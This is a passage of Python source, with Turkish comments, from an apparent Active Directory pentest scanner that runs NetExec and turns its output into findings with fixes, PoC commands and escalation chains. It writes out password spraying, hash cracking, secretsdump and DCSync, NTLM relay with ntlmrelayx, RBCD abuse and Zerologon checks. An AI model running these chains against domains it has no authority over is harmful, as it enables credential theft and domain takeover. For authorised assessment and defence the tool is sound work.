def parse_smb(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["nxc-smb"] = "\n\n".join(r.combined for r in results)
    combined = strip_dryrun("\n\n".join(r.combined for r in results))

    first = results[0] if results else None
    if first and not first.ok:
        report.add_error(f"nxc-smb: {first.error or 'çalıştırılamadı'}")
        return

    target = report.target

    # --- Otomatik domain + DC adı tespiti (downstream'e beslenir) ---
    _detect_domain(combined, report)

    # --- User hunting: oturum açmış kullanıcılar / aktif oturumlar -> hedefli lateral ---
    _parse_user_hunting(results, report)

    # --- RID brute: domain kullanıcılarını çıkar (null/guest ile bile) ---
    rid_out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("smb-rid-brute")), ""))
    rid_users = _parse_rid_brute(rid_out, report)
    if rid_users:
        report.samr_user_count = len(rid_users)
    if rid_users:
        report.add(Finding(
            title=f"RID brute ile {len(rid_users)} domain kullanıcısı enumere edildi — nxc",
            severity=Severity.MEDIUM,
            target=target, source="nxc-smb",
            description="SAMR/LSA üzerinden (çoğu zaman kimlik gerektirmeden) domain hesap "
                        "adları listelendi. Bu liste password spraying için doğrudan girdidir.",
            evidence="\n".join(rid_users[:40]),
            remediation="RestrictAnonymous / RestrictNullSessAccess ile anonim SAMR'ı kısıtlayın.",
            reference="RID Cycling / SAMR enumeration",
            poc=f"nxc smb {target} -u '' -p '' --rid-brute",
            escalation=f"Kullanıcı listesini users.txt'e yaz -> password spraying: 'adscan {target} "
                       "--spray --spray-userlist users.txt' (kilitlenme-farkında) veya --auto."))

    # --- LAPS: okunabilir yerel admin parolaları (kimlik varken) ---
    _parse_laps(results, report)

    # --- Print Spooler (PrinterBug/MS-RPRN) açık mı? coercion/relay primitifi ---
    _parse_spooler(results, report)

    # --- NTLMv1 / LM izinli mi? (downgrade/relay + crackable auth) ---
    _parse_ntlmv1(results, report)

    # --- WebDAV / GPP autologin / paylaşım içeriği (spider_plus, --full) ---
    _parse_webdav(results, report)
    _parse_gpp_autologin(results, report)
    _parse_spider(results, report)

    # signing:False  -> relay riski (nxc'nin net 'signing:False' ifadesine bağlı)
    if re.search(r"signing:\s*False", combined, re.IGNORECASE):
        report.add(
            Finding(
                title="SMB signing kapalı (NTLM relay riski) — nxc",
                severity=Severity.HIGH,
                target=target,
                source="nxc-smb",
                description="nxc SMB imzalamanın kapalı olduğunu bildirdi.",
                evidence=_grep(combined, r"signing:\s*False"),
                remediation="SMB signing'i GPO ile zorunlu yapın.",
                reference="NTLM Relay",
                poc=f"nxc smb {target}   # çıktıda (signing:False) görünür",
                escalation="Relay hedefi: başka bir host'tan buraya auth'u relay et "
                f"('adscan {target} --active-attacks --launch -I <iface> "
                "--relay-targets smb://{target}').",
            )
        )

    # SMBv1:True (net token)
    if re.search(r"SMBv1:\s*True", combined, re.IGNORECASE):
        report.add(
            Finding(
                title="SMBv1 etkin — nxc",
                severity=Severity.HIGH,
                target=target,
                source="nxc-smb",
                evidence=_grep(combined, r"SMBv1:\s*True"),
                remediation="SMBv1'i devre dışı bırakın.",
                reference="MS17-010",
                poc=f"nxc smb {target}   # (SMBv1:True)",
                escalation=f"MS17-010 kontrolü: 'adscan {target} --only nmap' veya "
                f"'nmap -p445 --script smb-vuln-ms17-010 {target}'.",
            )
        )

    # Yerel admin (Pwn3d!) — en spesifik ve yüksek güvenli sinyal
    pwned_lines = _grep(combined, r"\(Pwn3d!\)", context=0)
    if pwned_lines:
        report.add(
            Finding(
                title="Yerel admin erişimi (Pwn3d!) — nxc",
                severity=Severity.CRITICAL,
                target=target,
                source="nxc-smb",
                description="Verilen kimlik bu host'ta yerel yöneticidir.",
                evidence=pwned_lines,
                remediation="Yerel admin yetkisini gözden geçirin; LAPS kullanın.",
                reference="Local Admin",
                poc=f"nxc smb {target} -u <user> -p <pass>   # satır sonunda (Pwn3d!)",
                escalation=f"Kimlik dökümü: 'nxc smb {target} -u <user> -p <pass> --sam --lsa' "
                f"veya 'secretsdump.py <domain>/<user>@{target}'. DA ise --just-dc (DCSync).",
            )
        )

    # Null/anonim oturum: boş kullanıcı adıyla [+] (ör. 'domain\:')  -> FP'siz
    null_line = _grep(combined, r"\[\+\]\s+\S+\\:\s*($|\()", context=0) \
        or _grep(combined, r"\[\+\]\s+\S+\\:", context=0)
    if null_line and not pwned_lines:
        report.add(
            Finding(
                title="Null/anonim SMB oturumu mümkün — nxc",
                severity=Severity.HIGH,
                target=target,
                source="nxc-smb",
                description="Kimlik bilgisi olmadan (boş kullanıcı/parola) SMB oturumu açıldı.",
                evidence=null_line,
                remediation="RestrictAnonymous/RestrictNullSessAccess ile null session'ı kapatın.",
                reference="Null Session",
                poc=f"nxc smb {target} -u '' -p ''",
                escalation=f"Enum: 'nxc smb {target} -u '' -p '' --shares --users --pass-pol' "
                "-> kullanıcı listesi çıkarsa password spraying (--spray).",
            )
        )

    # Guest fallback — nxc geçersiz kimliği Guest olarak kabul edince '(Guest)' ekler
    if re.search(r"\(Guest\)", combined):
        report.add(
            Finding(
                title="Guest hesabı etkin (kimlik doğrulama guest'e düşüyor) — nxc",
                severity=Severity.HIGH,
                target=target,
                source="nxc-smb",
                description="Geçersiz/boş kimlik Guest olarak kabul ediliyor; yetkisiz enumerasyon mümkün.",
                evidence=_grep(combined, r"\(Guest\)", context=0),
                remediation="Guest hesabını devre dışı bırakın (varsayılan olarak kapalı olmalı).",
                reference="SMB Guest access",
                poc=f"nxc smb {target} -u 'guest' -p ''   # satır sonunda (Guest)",
                escalation=f"Enum: 'nxc smb {target} -u guest -p '' --shares --users'.",
            )
        )

    # Erişilebilir paylaşımlar — SADECE --shares çıktısından, izin sütununa göre (FP↓)
    shares_out = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("smb-shares")), ""))
    share_lines = _grep(shares_out, r"\s(READ|WRITE)(,WRITE)?\b", context=0)
    if share_lines:
        has_write = bool(re.search(r"\bWRITE\b", shares_out))
        report.add(
            Finding(
                title="Erişilebilir SMB paylaşımları bulundu — nxc",
                severity=Severity.MEDIUM if has_write else Severity.LOW,
                target=target,
                source="nxc-smb",
                description="Geçerli hesap ile okunabilir/yazılabilir paylaşımlar.",
                evidence=share_lines,
                remediation="Paylaşım ACL'lerini en az yetki ilkesine göre düzenleyin.",
                poc=f"nxc smb {target} -u <user> -p <pass> --shares",
                escalation=f"İçerik tara: 'nxc smb {target} -u <user> -p <pass> -M spider_plus' "
                "-> parola/konfig dosyaları, SYSVOL'de GPP (cpassword).",
            )
        )

    _parse_nondefault_shares(shares_out, target, report)

    # Zayıf parola politikası
    m = re.search(r"Minimum password length:\s*(\d+)", combined, re.IGNORECASE)
    if m and int(m.group(1)) < 8:
        report.add(
            Finding(
                title=f"Zayıf parola politikası (min {m.group(1)} karakter) — nxc",
                severity=Severity.MEDIUM,
                target=target,
                source="nxc-smb",
                evidence=_grep(combined, r"password|lockout", context=0),
                remediation="Minimum parola uzunluğunu ve kilitleme eşiğini artırın.",
                poc=f"nxc smb {target} -u <user> -p <pass> --pass-pol",
                escalation=f"Düşük eşik -> password spraying: 'adscan {target} --spray "
                "--spray-userlist users.txt --spray-passwords 123456,Password1' (kilitlenme-farkında).",
            )
        )

    # Hesap kilitleme eşiği = 0 / None -> SINIRSIZ password spraying mümkün (kilitlenme yok).
    # FP guard: yalnızca 'smb-passpol' çıktısındaki açık 'None/0/Disabled' değerinde.
    passpol = strip_dryrun(next(
        (r.combined for r in results if r.tool.endswith("smb-passpol")), ""))
    lk = re.search(r"Account Lockout Threshold:\s*(None|Disabled|0)\b", passpol, re.IGNORECASE)
    if lk:
        report.add(
            Finding(
                title="Hesap kilitleme YOK (lockout threshold = 0/None) — nxc",
                severity=Severity.MEDIUM, target=target, source="nxc-smb",
                description="Hesap kilitleme eşiği tanımsız/sıfır. Bu, bir hesaba sınırsız "
                            "parola denemesi (kilitlenme riski olmadan brute-force/spray) "
                            "yapılabileceği anlamına gelir.",
                evidence=_grep(passpol, r"lockout", context=0),
                remediation="Makul bir kilitleme eşiği (ör. 5-10) ve gözlem penceresi ayarlayın.",
                reference="Account Lockout Policy",
                poc=f"nxc smb {target} -u <user> -p <pass> --pass-pol",
                escalation=f"Sınırsız spray: 'adscan {target} --spray --spray-userlist users.txt "
                           "--spray-passlist rockyou.txt' (eşik yoksa agresif denenebilir).",
            )
        )


# ---------------------------------------------------------------------------
# LDAP
# ---------------------------------------------------------------------------

def ldap_scan(
    target: str,
    *,
    username: str | None = None,
    password: str | None = None,
    nthash: str | None = None,
    domain: str | None = None,
    timeout: int = 300,
    dry_run: bool = False,
    outdir: str = "adscan-reports",
    use_kerberos: bool = False,
) -> list[CommandResult]:
    status = tool()
    bin_name = status.name
    base = [bin_name, "ldap", target] + _creds_args(
        username, password, nthash, domain, use_kerberos)
    asrep_out = _loot_path(outdir, "asrep.txt")
    kerb_out = _loot_path(outdir, "kerb.txt")

    runs = [
        ("ldap-info", base),
        # Genel enumerasyon: kimlikli bind başarılıysa kullanıcı/grup listesi çeker
        ("ldap-users", base + ["--users"]),
        ("ldap-groups", base + ["--groups"]),
        ("ldap-asrep", base + ["--asreproast", asrep_out]),
        ("ldap-kerberoast", base + ["--kerberoasting", kerb_out]),
        ("ldap-admincount", base + ["--admin-count"]),
        ("ldap-trusted-delegation", base + ["--trusted-for-delegation"]),
        ("ldap-pass-not-required", base + ["--password-not-required"]),
    ]
    # Kimlik varken ek enumerasyon (bind gerektirenler)
    if username and (password is not None or nthash or use_kerberos):
        runs.append(("ldap-gmsa", base + ["--gmsa"]))
        # Kullanıcı 'description' alanında saklanan parolalar (klasik, yüksek-değerli)
        runs.append(("ldap-desc", base + ["-M", "get-desc-users"]))
        # constrained + RBCD + unconstrained delegasyonu TEK sorguda bulur
        runs.append(("ldap-find-delegation", base + ["--find-delegation"]))
        # ADCS PKI enrollment server / şablon keşfi (certipy yoksa da ESC8 hedefi verir)
        runs.append(("ldap-adcs", base + ["-M", "adcs"]))

    results = []
    has_auth = bool(username and (password is not None or nthash or use_kerberos))
    for label, argv in runs:
        if label == "ldap-kerberoast" and not has_auth:
            results.append(CommandResult(tool=f"nxc:{label}:skip", argv=[], returncode=None,
                           stdout="", stderr="", duration=0,
                           error="Kimlik gerekli", error_kind="skipped"))
            continue
        results.append(run(argv, tool=f"nxc:{label}", timeout=timeout, dry_run=dry_run))
    return results


def parse_ldap(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["nxc-ldap"] = "\n\n".join(r.combined for r in results)
    combined = strip_dryrun("\n\n".join(r.combined for r in results))

    first = results[0] if results else None
    if first and not first.ok:
        report.add_error(f"nxc-ldap: {first.error or 'çalıştırılamadı'}")
        return

    target = report.target
    _detect_domain(combined, report)
    _parse_ldap_enum(results, report)   # genel kullanıcı/grup enumerasyonu
    _check_ldap_auth(results, combined, report)  # bind başarısızsa nedenini söyle
    _parse_gmsa(results, report)
    _parse_admin_count(results, report)         # adminCount=1 / adminSDHolder
    _parse_user_descriptions(results, report)   # description alanında parola

    # AS-REP roastable hesaplar ($krb5asrep$)
    if re.search(r"\$krb5asrep\$", combined):
        report.add(
            Finding(
                title="AS-REP Roasting'e açık hesap(lar) — nxc",
                severity=Severity.HIGH,
                target=target,
                source="nxc-ldap",
                description="Pre-auth kapalı hesaplar için AS-REP hash'i çevrimdışı kırılabilir.",
                evidence=_grep(combined, r"\$krb5asrep\$|asrep", context=0),
                remediation="İlgili hesaplarda 'Do not require Kerberos preauth' seçeneğini kapatın.",
                reference="AS-REP Roasting",
                poc=f"nxc ldap {target} -u <user> -p <pass> --asreproast loot/asrep.txt",
                escalation=(
                    "1) Hash'i çevrimdışı kır:\n"
                    "   hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt\n"
                    "   • Çevrimdışı kırma: açıkça --crack (ya da --auto)\n"
                    f"2) Kimliksiz toplama (kullanıcı listesiyle): GetNPUsers.py <domain>/ "
                    f"-dc-ip {target} -usersfile users.txt -no-pass\n"
                    f"3) Kırılan parolayla yanal hareket: adscan {target} --reuse -u <hesap> -p <kırılan>\n"
                    "4) Host'larda Pwn3d ara -> secretsdump -> hash zinciri -> DCSync (DA)"),
            )
        )

    # Kerberoastable hesaplar ($krb5tgs$)
    if re.search(r"\$krb5tgs\$", combined):
        report.add(
            Finding(
                title="Kerberoasting'e açık servis hesabı/hesapları — nxc",
                severity=Severity.HIGH,
                target=target,
                source="nxc-ldap",
                description="SPN'li hesapların TGS hash'leri çevrimdışı kırılabilir.",
                evidence=_grep(combined, r"\$krb5tgs\$", context=0),
                remediation="Servis hesaplarına uzun/karmaşık parola veya gMSA kullanın.",
                reference="Kerberoasting",
                poc=f"nxc ldap {target} -u <user> -p <pass> --kerberoasting loot/kerb.txt",
                escalation=(
                    "1) Hash'i çevrimdışı kır (RC4):\n"
                    "   hashcat -m 13100 loot/kerb.txt /usr/share/wordlists/rockyou.txt\n"
                    "   • AES bilet ise: -m 19600 (AES128) / -m 19700 (AES256)\n"
                    "   • Çevrimdışı kırma: açıkça --crack (ya da --auto)\n"
                    f"2) Alternatif toplama: GetUserSPNs.py <domain>/<user>:<pass> -dc-ip {target} -request\n"
                    f"3) Kırılan servis parolasıyla yanal hareket: adscan {target} --reuse -u <svc> -p <kırılan>\n"
                    "4) SPN sahibi ayrıcalıklıysa (Domain Admins üyesi) -> doğrudan DA;\n"
                    "   değilse Pwn3d olunan host'ta secretsdump -> yeni hash -> zincir"),
            )
        )

    # Parola gerektirmeyen hesaplar.
    # FP guard: "[-] No accounts with PASSWD_NOTREQD" olumsuz satırına takılma;
    # yalnızca gerçek bir hesap satırında raporla.
    pnr_lines = [ln.strip() for ln in combined.splitlines()
                 if re.search(r"password.?not.?required|PASSWD_NOTREQD", ln, re.IGNORECASE)
                 and not _is_negative_line(ln)]
    if pnr_lines:
        report.add(
            Finding(
                title="Parola gerektirmeyen hesap(lar) — nxc",
                severity=Severity.HIGH,
                target=target,
                source="nxc-ldap",
                evidence="\n".join(pnr_lines[:25]),
                remediation="PASSWD_NOTREQD bayrağını kaldırın.",
                poc=f"nxc ldap {target} -u <user> -p <pass> --password-not-required",
                escalation=f"Bu hesaplarda BOŞ parola dene: 'nxc smb {target} -u <hesap> -p ''' "
                "-> başarılıysa doğrudan oturum.",
            )
        )

    # Unconstrained / trusted for delegation.
    # FP guard: "[*] Searching…" banner'ı / "[-] No accounts…found" olumsuzu değil,
    # yalnızca gerçek hesap/host içeren satır(lar) raporlanır.
    unconstrained = _unconstrained_lines(combined)
    if unconstrained:
        report.add(
            Finding(
                title="Delegasyona güvenilen hesap/host (unconstrained delegation) — nxc",
                severity=Severity.HIGH,
                target=target,
                source="nxc-ldap",
                description="Unconstrained delegation, kimlik taklidi ile yetki yükseltmeye yol açabilir.",
                evidence=unconstrained,
                remediation="Unconstrained yerine constrained/RBCD kullanın; gereksizleri kaldırın.",
                reference="Kerberos Delegation",
                poc=f"nxc ldap {target} -u <user> -p <pass> --trusted-for-delegation",
                escalation="Unconstrained host ele geçerse: PetitPotam/printerbug ile DC'yi "
                "auth'a zorla -> DC TGT yakala -> DCSync. ('adscan --active-attacks').",
            )
        )

    _parse_delegation_adcs(combined, report)

    # LDAP signing / channel binding uyarısı (nxc bazen bildirir)
    # FP guard: "signing is required" güvenli durumuna takılma — yalnızca açıkça
    # "not required/enforced" ifadesinde raporla.
    if re.search(r"(LDAP signing|channel binding)[^\n]*\bnot\s+(required|enforced|enabled)",
                 combined, re.IGNORECASE):
        report.add(
            Finding(
                title="LDAP signing / channel binding zorunlu değil — nxc",
                severity=Severity.MEDIUM,
                target=target,
                source="nxc-ldap",
                evidence=_grep(combined, r"signing|channel binding", context=0),
                remediation="LDAP signing ve channel binding'i zorunlu kılın (LDAPS relay koruması).",
                reference="LDAP Relay",
                poc=f"nxc ldap {target}   # 'LDAP signing NOT required/enforced' uyarısı",
                escalation="LDAP relay: yakalanan auth'u ldaps://DC'ye relay et (RBCD/ACL "
                "suistimali) -> 'adscan --active-attacks --launch'.",
            )
        )

    # Modern nxc banner biçimi: "(signing:Enforced) (channel binding:Never)".
    # signing zorunlu OLSA BİLE channel binding Never/No ise LDAPS relay hâlâ
    # mümkündür — bu nüans yukarıdaki "not required" kalıbına takılmaz, ayrı bas.
    cb = re.search(r"channel binding:\s*(Never|No|Off|Disabled)", combined, re.IGNORECASE)
    if cb and not re.search(r"channel binding[^\n]*\bnot\b", combined, re.IGNORECASE):
        sign_enf = bool(re.search(r"signing:\s*(Enforced|Required|True)", combined,
                                  re.IGNORECASE))
        report.add(
            Finding(
                title="LDAP channel binding = Never — signing'e rağmen LDAP relay mümkün — nxc",
                severity=Severity.HIGH,
                target=target,
                source="nxc-ldap",
                control_id="ldap.channel-binding.never",
                reference="LDAP Relay / EPA (CVE-2017-8563 sınıfı)",
                mitre="T1557.001",
                description="DC, LDAP için channel binding (EPA) ZORLAMIYOR. "
                            + ("SMB/LDAP signing zorunlu olsa bile " if sign_enf else "")
                            + "channel binding Never olduğundan, coercion ile zorlanan bir "
                            "makine/DC auth'u ldaps://DC'ye relay edilerek RBCD/Shadow "
                            "Credentials/ACL suistimaliyle domain ele geçirilebilir.",
                evidence="\n".join(dict.fromkeys(
                    _grep(combined, r"signing:.*channel binding:", context=0).splitlines())),
                remediation="DC'de LDAP channel binding'i (LdapEnforceChannelBinding=2) ve "
                            "LDAP signing'i zorunlu kılın; RPC coercion yüzeylerini kapatın.",
                poc=f"nxc ldap {target}   # banner'da '(channel binding:Never)' görünür",
                escalation="coerce (PetitPotam/printerbug/dfscoerce) + "
                           "ntlmrelayx.py -t ldaps://<DC> --remove-mic --delegate-access "
                           "(RBCD) ya da --shadow-credentials -> DC TGT -> DCSync (DA). "
                           "Hazır akış: 'adscan --active-attacks --launch'.",
            )
        )


_DEFAULT_SHARES = {"ADMIN$", "C$", "IPC$", "NETLOGON", "SYSVOL", "PRINT$"}
_SHARE_LINE_RX = re.compile(
    r"^SMB\s+\S+\s+\d+\s+\S+\s+(?P<name>\S[^\t]*?)\s+"
    r"(?P<perm>READ(?:,WRITE)?|WRITE|READ_ONLY|)\s*(?P<remark>\S.*)?$")


def _parse_nondefault_shares(shares_out: str, target: str, report: ScanReport) -> None:
    """Varsayılan olmayan (özel) paylaşımları raporlar — ERİŞİLEMEYENLER dahil.

    Varsayılan dışı bir paylaşımın VARLIĞI (ör. 'IT', 'Dev', 'Backup') içeride
    ilginç veri olduğunu gösterir; erişim REDDEDİLMİŞSE bu, başka bir kimlikle
    hedeflenecek bir yüzeydir — sadece okunabilir paylaşımları raporlamak bu
    sinyali kaçırır.
    """
    readable: list[str] = []
    denied: list[str] = []
    for line in shares_out.splitlines():
        m = _SHARE_LINE_RX.match(line.rstrip())
        if not m:
            continue
        name = m.group("name").strip()
        if not name or name.upper() in _DEFAULT_SHARES or name.lower() == "share":
            continue
        perm = (m.group("perm") or "").strip().upper()
        if perm in ("READ", "WRITE", "READ,WRITE"):
            readable.append(f"{name}  [{perm}]")
        else:
            denied.append(name)
    if not readable and not denied:
        return
    ev = []
    if readable:
        ev.append("Erişilebilir özel paylaşım(lar):\n  " + "\n  ".join(readable))
    if denied:
        ev.append("Erişilemeyen (ama VAR) özel paylaşım(lar) — başka kimlikle hedef:\n  "
                  + "\n  ".join(denied))
    # Erişilemeyen özel paylaşım bir ipucu (hedef); erişilebilir olan ise veri sızıntısı.
    sev = Severity.MEDIUM if readable else Severity.LOW
    report.add(Finding(
        title=f"Varsayılan olmayan SMB paylaşımı tespit edildi "
              f"({len(readable)} erişilebilir, {len(denied)} erişilemez) — nxc",
        severity=sev, target=target, source="nxc-smb",
        control_id="smb.nondefault-share", mitre="T1135",
        description="Standart AD paylaşımları (SYSVOL/NETLOGON/C$/ADMIN$/IPC$) dışında özel "
                    "paylaşım(lar) var. Erişilebilenlerde doğrudan veri; erişilemeyenler ise "
                    "doğru kimlikle ulaşılacak öncelikli hedeftir.",
        evidence="\n".join(ev),
        remediation="Özel paylaşımların ACL'lerini en az yetki ilkesine göre denetleyin.",
        poc=f"nxc smb {target} -u <user> -p <pass> --shares   ;  "
            f"nxc smb {target} -u <user> -p <pass> -M spider_plus",
        escalation="Erişilebilir: 'spider_plus' ile parola/konfig avı. Erişilemez: hedef "
                   "paylaşıma yetkili kullanıcıyı (BloodHound/group-mem) bul -> o kimlikle oku."))


# netexec'in OLUMSUZ/banner satırları — bu satırlar bulgu ÜRETMEMELİ (FP guard).
# "[-] No accounts found", "[*] Searching…", "0 results", "is not vulnerable" vb.
_NEG_LINE_RX = re.compile(
    r"\[[\-*!]\]|searching|enumerat|"
    r"\bno\s+(accounts?|users?|results?|entries|objects?|computers?)\b|"
    r"\bnone\b|not\s+found|\b0\s+(found|accounts?|results?|entries)\b|"
    r"is\s+not\s+vulnerable",
    re.IGNORECASE)


def _is_negative_line(line: str) -> bool:
    """Satır, aracın olumsuz/banner çıktısı mı? (bulgu üretmemek için)."""
    return bool(_NEG_LINE_RX.search(line))


def _unconstrained_lines(combined: str) -> str:
    """unconstrained / trusted-for-delegation için GERÇEK veri satırları.

    FP guard: arama banner'ları ("[*] Searching for unconstrained delegation")
    ve olumsuz sonuçlar ("[-] No accounts … found") elenir; constrained/RBCD
    ayrı bulgularda ele alınır, burada sayılmaz.
    """
    out: list[str] = []
    for ln in combined.splitlines():
        low = ln.lower()
        if "unconstrained" not in low and not re.search(r"trusted.?for.?delegation", low):
            continue
        if _is_negative_line(ln):
            continue
        if "constrained" in low and "unconstrained" not in low:
            continue  # constrained/RBCD -> _parse_delegation_adcs
        out.append(ln.strip())
    return "\n".join(out[:25])


def _delegation_lines(combined: str, want: str) -> str:
    """--find-delegation çıktısından istenen delegasyon türünün satırlarını süzer.

    want='constrained' -> Constrained / Constrained w/ Protocol Transition
    want='rbcd'        -> Resource-Based Constrained
    (Unconstrained ayrı bir bulguda zaten ele alınıyor.)
    """
    out = []
    for ln in combined.splitlines():
        low = ln.lower()
        if "delegation" not in low and "constrained" not in low and "rbcd" not in low:
            continue
        if want == "rbcd" and ("resource-based" in low or "rbcd" in low):
            out.append(ln.strip())
        elif want == "constrained" and "constrained" in low \
                and "unconstrained" not in low and "resource-based" not in low:
            out.append(ln.strip())
    return "\n".join(out[:25])


def _parse_delegation_adcs(combined: str, report: ScanReport) -> None:
    """--find-delegation (constrained/RBCD) ve -M adcs (CA keşfi) çıktılarını işler."""
    target = report.target

    # Constrained delegation (allowedToDelegateTo) — S4U suistimali
    constrained = _delegation_lines(combined, "constrained")
    if constrained:
        report.add(Finding(
            title="Constrained delegation (S4U) yapılandırılmış hesap/host — nxc",
            severity=Severity.HIGH, target=target, source="nxc-ldap",
            description="msDS-AllowedToDelegateTo ayarlı hesap ele geçerse S4U2self+S4U2proxy "
                        "ile hedef servise yönetici taklidiyle erişilebilir "
                        "(protocol transition varsa herhangi bir kullanıcı).",
            evidence=constrained,
            remediation="Gereksiz constrained delegation'ı kaldırın; 'protocol transition' "
                        "(TRUSTED_TO_AUTH_FOR_DELEGATION) kullanımını denetleyin.",
            reference="Constrained Delegation (S4U2proxy)", mitre="T1558.003",
            poc=f"nxc ldap {target} -u <user> -p <pass> --find-delegation",
            escalation="Hesabın parolası/hash'i ele geçerse: 'getST.py -spn "
                       "<izinli-spn> -impersonate Administrator <domain>/<hesap>:<pass>' "
                       "(hash ile: -hashes :<nt>) -> 'export KRB5CCNAME=Administrator.ccache' "
                       "-> 'nxc smb <hedef> --use-kcache' / psexec -> yanal hareket / DA."))

    # Resource-Based Constrained Delegation (RBCD)
    rbcd = _delegation_lines(combined, "rbcd")
    if rbcd:
        report.add(Finding(
            title="Resource-Based Constrained Delegation (RBCD) yapılandırması — nxc",
            severity=Severity.HIGH, target=target, source="nxc-ldap",
            description="msDS-AllowedToActOnBehalfOfOtherIdentity ayarlı nesne; bu nesneye "
                        "yazabilen biri S4U ile üzerinde yönetici taklidi yapabilir.",
            evidence=rbcd,
            remediation="RBCD atamalarını denetleyin; yazma haklarını (GenericWrite/GenericAll) "
                        "kısıtlayın; MachineAccountQuota=0 yapın.",
            reference="RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)", mitre="T1098",
            poc=f"nxc ldap {target} -u <user> -p <pass> --find-delegation",
            escalation="Hedefe yazma hakkın varsa: 'addcomputer.py -computer-name EVIL$ "
                       "-computer-pass P@ss <domain>/<user>:<pass>' -> 'bloodyAD ... add rbcd "
                       "<hedef> EVIL$' -> 'getST.py -spn cifs/<hedef> -impersonate Administrator "
                       "<domain>/EVIL$:P@ss' -> admin erişimi."))

    # ADCS: PKI enrollment server / CA keşfi (certipy yoksa da ESC8 hedefi verir)
    if re.search(r"Found PKI Enrollment Server|Certificate Authorit|CA Name|certsrv",
                 combined, re.IGNORECASE):
        ev = _grep(combined, r"PKI Enrollment|CA Name|Certificate Authorit|Web Enrollment|certsrv",
                   context=0, limit=20)
        report.add(Finding(
            title="ADCS Sertifika Yetkilisi (CA) tespit edildi — nxc",
            severity=Severity.MEDIUM, target=target, source="nxc-ldap",
            description="Active Directory Certificate Services kurulu. Zafiyetli şablonlar "
                        "(ESC1-ESC16) düşük yetkili kullanıcıyı Domain Admin'e taşıyabilir; "
                        "web enrollment açıksa ESC8 (NTLM relay) mümkündür.",
            evidence=ev or "ADCS enrollment service bulundu",
            remediation="Şablon ACL'lerini ve enrollment haklarını denetleyin; web enrollment "
                        "(HTTP) üzerinde EPA/HTTPS zorunlu kılın.",
            reference="ADCS (ESC1-ESC16)", mitre="T1649",
            poc=f"certipy find -u <user>@<dom> -dc-ip {target} -vulnerable -stdout",
            escalation="Zafiyetli şablon bulursan ('adscan --adcs'): kendine DA kimliğiyle "
                       "sertifika çıkar -> PKINIT ile TGT/NT hash -> DCSync. Web enrollment "
                       "açıksa ESC8: 'adscan --active-attacks --launch --adcs-ca-url <url>'."))


# ---------------------------------------------------------------------------
# Zafiyet modülleri (nxc -M): zerologon, coerce_plus, maq, pre2k
# ---------------------------------------------------------------------------

def vuln_scan(
    target: str,
    *,
    username: str | None = None,
    password: str | None = None,
    nthash: str | None = None,
    domain: str | None = None,
    timeout: int = 300,
    dry_run: bool = False,
    use_kerberos: bool = False,
) -> list[CommandResult]:
    """nxc modül (-M) tabanlı aktif zafiyet kontrolleri."""
    status = tool()
    bin_name = status.name
    smb_base = [bin_name, "smb", target] + _creds_args(
        username, password, nthash, domain, use_kerberos)
    ldap_base = [bin_name, "ldap", target] + _creds_args(
        username, password, nthash, domain, use_kerberos)

    from .. import capabilities as _cap

    runs = [
        ("zerologon", smb_base + ["-M", "zerologon"]),
        # coerce_plus, PetitPotam/DFSCoerce/ShadowCoerce/Printerbug/MS-EVEN'i TEK modülde
        # kapsar. (Eski 'petitpotam' modülü NetExec'ten KALDIRILDI — kullanılmaz.)
        ("coerce", smb_base + ["-M", "coerce_plus"]),
        ("maq", ldap_base + ["-M", "maq"]),
        # pre2k: pre-created makine hesapları (parola = makine adı, küçük harf)
        ("pre2k", ldap_base + ["-M", "pre2k"]),
        # MS17-010 (EternalBlue): nmap NSE'den BAĞIMSIZ çapraz-doğrulama (kimliksiz).
        ("ms17-010", smb_base + ["-M", "ms17-010"]),
        # GPP cpassword (MS14-025 / CVE-2014-1812): SYSVOL Groups.xml -> çözülmüş parola.
        ("gpp-password", smb_base + ["-M", "gpp_password"]),
    ]
    # Sürüme bağlı/opsiyonel modüller (F: kurulu değilse çalıştırma — sessiz
    # başarısızlık/gürültü olmasın). Modül listesi tespit edilemezse yine denenir.
    if _cap.nxc_has_module("timeroast"):
        # Timeroasting: kimliksiz, RID tabanlı NTP ile makine hesabı hash'i.
        runs.append(("timeroast", smb_base + ["-M", "timeroast"]))
    if _cap.nxc_has_module("nopac"):
        # noPac (CVE-2021-42278/42287): sAMAccountName spoof -> DA.
        runs.append(("nopac", smb_base + ["-M", "nopac"]))
    if _cap.nxc_has_module("enum_trusts"):
        # Domain/forest trust'ları: cross-domain saldırı yüzeyi.
        runs.append(("enum-trusts", ldap_base + ["-M", "enum_trusts"]))
    if _cap.nxc_has_module("printnightmare"):
        # PrintNightmare (CVE-2021-1675/34527): Spooler RCE -> SYSTEM/DC ele geçirme.
        runs.append(("printnightmare", smb_base + ["-M", "printnightmare"]))
    if _cap.nxc_has_module("smbghost"):
        # SMBGhost (CVE-2020-0796): SMBv3.1.1 compression RCE.
        runs.append(("smbghost", smb_base + ["-M", "smbghost"]))
    if _cap.nxc_has_module("sccm"):
        # SCCM/MECM keşfi: NAA kimlikleri / PXE / site sunucuları (kimlik ister).
        runs.append(("sccm", ldap_base + ["-M", "sccm"]))

    results = []
    has_auth = bool(username and (password is not None or nthash or use_kerberos))
    auth_required = {"maq", "pre2k", "nopac", "enum-trusts", "sccm"}
    for label, argv in runs:
        if label in auth_required and not has_auth:
            results.append(CommandResult(tool=f"nxc:{label}:skip", argv=[], returncode=None,
                           stdout="", stderr="", duration=0,
                           error="Kimlik gerekli", error_kind="skipped"))
            continue
        results.append(run(argv, tool=f"nxc:{label}", timeout=timeout, dry_run=dry_run))
    return results


def parse_vuln(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["nxc-vulns"] = "\n\n".join(r.combined for r in results)
    combined = strip_dryrun("\n\n".join(r.combined for r in results))
    target = report.target

    # Zerologon (CVE-2020-1472) — DC parolasını sıfırlayıp domain ele geçirme.
    # FP guard: "Target is NOT vulnerable" satırındaki "vulnerable"a TAKILMA —
    # yalnızca olumsuzlanmamış, DOĞRULANMIŞ bir zerologon satırında raporla.
    zl_line = _pos_vuln(combined, r"zerologon")
    if zl_line:
        report.add(
            Finding(
                title="Zerologon (CVE-2020-1472) ZAFİYETLİ",
                severity=Severity.CRITICAL,
                target=target,
                source="nxc-vulns",
